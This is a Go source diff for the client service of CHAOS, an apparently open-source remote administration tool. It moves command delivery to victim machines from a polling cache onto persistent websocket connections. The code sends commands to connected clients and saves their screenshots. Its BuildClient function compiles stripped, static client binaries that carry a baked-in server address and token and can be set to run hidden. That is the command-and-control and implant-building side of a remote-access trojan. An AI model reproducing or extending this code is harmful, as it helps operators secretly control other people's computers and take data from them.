@@ -2,69 +2,114 @@ package client
 
 import (
 	"context"
+	"encoding/json"
 	"fmt"
 	"github.com/google/uuid"
+	"github.com/gorilla/websocket"
+	"github.com/tiagorlampert/CHAOS/entities"
 	"github.com/tiagorlampert/CHAOS/internal"
+	"github.com/tiagorlampert/CHAOS/internal/environment"
 	"github.com/tiagorlampert/CHAOS/internal/utils"
 	"github.com/tiagorlampert/CHAOS/internal/utils/image"
 	"github.com/tiagorlampert/CHAOS/internal/utils/jwt"
 	"github.com/tiagorlampert/CHAOS/internal/utils/system"
+	"github.com/tiagorlampert/CHAOS/presentation/http/request"
 	authRepo "github.com/tiagorlampert/CHAOS/repositories/auth"
 	"github.com/tiagorlampert/CHAOS/services/auth"
-	"github.com/tiagorlampert/CHAOS/services/payload"
 	"net"
 	"net/url"
 	"os/exec"
 	"strings"
-	"time"
+	"sync"
 )
 
 type clientService struct {
-	AppVersion     string
-	Repository     authRepo.Repository
-	PayloadService payload.Service
-	AuthService    auth.Service
+	AppVersion    string
+	Clients       map[string]*websocket.Conn
+	Mu            *sync.Mutex
+	configuration *environment.Configuration
+	Repository    authRepo.Repository
+	AuthService   auth.Service
 }
 
 func NewClientService(
 	appVersion string,
+	configuration *environment.Configuration,
 	repository authRepo.Repository,
-	payloadCache payload.Service,
 	authService auth.Service,
 ) Service {
 	return &clientService{
-		Repository:     repository,
-		PayloadService: payloadCache,
-		AppVersion:     appVersion,
-		AuthService:    authService,
+		AppVersion:    appVersion,
+		configuration: configuration,
+		Clients:       make(map[string]*websocket.Conn, 0),
+		Mu:            &sync.Mutex{},
+		Repository:    repository,
+		AuthService:   authService,
 	}
 }
 
+func (c clientService) GetConnection(clientID string) (*websocket.Conn, bool) {
+	c.Mu.Lock()
+	conn, found := c.Clients[clientID]
+	c.Mu.Unlock()
+	return conn, found
+}
+
+func (c clientService) RemoveConnection(clientID string) error {
+	c.Mu.Lock()
+	delete(c.Clients, clientID)
+	c.Mu.Unlock()
+	return nil
+}
+
+func (c clientService) AddConnection(clientID string, connection *websocket.Conn) error {
+	c.Mu.Lock()
+	c.Clients[clientID] = connection
+	c.Mu.Unlock()
+	return nil
+}
+
 func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) (SendCommandOutput, error) {
-	addr, err := utils.DecodeBase64(input.MacAddress)
+	client, found := c.GetConnection(input.ClientID)
+	if !found {
+		return SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}, nil
+	}
+
+	command := &entities.Command{
+		Command:   input.Command,
+		Parameter: input.Parameter,
+	}
+
+	req, err := json.Marshal(command)
 	if err != nil {
-		return SendCommandOutput{}, fmt.Errorf(`error decoding base64: %w`, err)
+		return SendCommandOutput{}, err
 	}
 
-	c.PayloadService.Set(addr, &payload.Data{
-		Request: input.Request,
-	})
-	defer c.PayloadService.Remove(addr)
-
-	var payloadData *payload.Data
-	var done bool
-	for !done {
-		time.Sleep(2 * time.Second)
-		res, _ := c.PayloadService.Get(addr)
-		res.Request = input.Request
-		if res.HasResponse {
-			payloadData, _ = HandleResponse(res)
-			done = true
-		}
+	err = client.WriteMessage(websocket.BinaryMessage, req)
+	if err != nil {
+		return SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}, nil
 	}
 
-	res := utils.ByteToString(payloadData.Response)
-	if payloadData.HasError {
+	_, readMessage, err := client.ReadMessage()
+	if err != nil {
+		return SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}, nil
+	}
+
+	var response request.RespondCommandRequestBody
+	if err := json.Unmarshal(readMessage, &response); err != nil {
+		return SendCommandOutput{}, err
+	}
+
+	command.Response = response.Response
+	command.HasError = response.HasError
+
+	command, err = handleResponse(command)
+	if err != nil {
+		return SendCommandOutput{}, err
+	}
+
+	res := utils.ByteToString(command.Response)
+	if command.HasError {
 		return SendCommandOutput{}, fmt.Errorf(res)
 	}
 	if len(strings.TrimSpace(res)) == 0 {
@@ -73,14 +118,14 @@ func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) 
 	return SendCommandOutput{Response: res}, nil
 }
 
-func HandleResponse(payload *payload.Data) (*payload.Data, error) {
-	switch payload.Request {
+func handleResponse(payload *entities.Command) (*entities.Command, error) {
+	switch payload.Command {
 	case "screenshot":
-		file, err := image.WritePNG(payload.Response)
+		filepath, err := image.WritePNG(payload.Response)
 		if err != nil {
 			return nil, err
 		}
-		payload.Response = utils.StringToByte(file)
+		payload.Response = utils.StringToByte(filepath)
 		break
 	default:
 		return payload, nil
@@ -90,10 +135,10 @@ func HandleResponse(payload *payload.Data) (*payload.Data, error) {
 
 func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error) {
 	if !isValidIPAddress(input.ServerAddress) && !isValidURL(input.ServerAddress) {
-		return "", ErrInvalidServerAddress
+		return "", internal.ErrInvalidServerAddress
 	}
 
-	newFilename, err := utils.NormalizeString(input.Filename)
+	filename, err := utils.NormalizeString(input.Filename)
 	if err != nil {
 		return "", err
 	}
@@ -103,10 +148,10 @@ func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error)
 		return "", err
 	}
 
-	const buildStr = `GO_ENABLED=1 GOOS=%s GOARCH=amd64 go build -ldflags '%s -s -w -X main.Version=%s -X main.ServerPort=%s -X main.ServerAddress=%s -X main.Token=%s -extldflags "-static"' -o ../temp/%s main.go`
+	const buildStr = `GO_ENABLED=1 GOOS=%s GOARCH=amd64 go build -ldflags '%s -s -w -X main.Version=%s -X main.Port=%s -X main.ServerAddress=%s -X main.Token=%s -extldflags "-static"' -o ../temp/%s main.go`
 
-	newFilename = buildFilename(input.OSTarget, newFilename)
-	buildCmd := fmt.Sprintf(buildStr, handleOSType(input.OSTarget), runHidden(input.RunHidden), c.AppVersion, input.ServerPort, input.ServerAddress, newToken, newFilename)
+	filename = buildFilename(input.OSTarget, filename)
+	buildCmd := fmt.Sprintf(buildStr, handleOSType(input.OSTarget), runHidden(input.RunHidden), c.AppVersion, input.ServerPort, input.ServerAddress, newToken, filename)
 
 	cmd := exec.Command("sh", "-c", buildCmd)
 	cmd.Dir = "client/"
@@ -115,7 +160,7 @@ func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error)
 	if err != nil {
 		return "", fmt.Errorf("%w:%s", err, outputErr)
 	}
-	return newFilename, nil
+	return filename, nil
 }
 
 func isValidIPAddress(s string) bool {
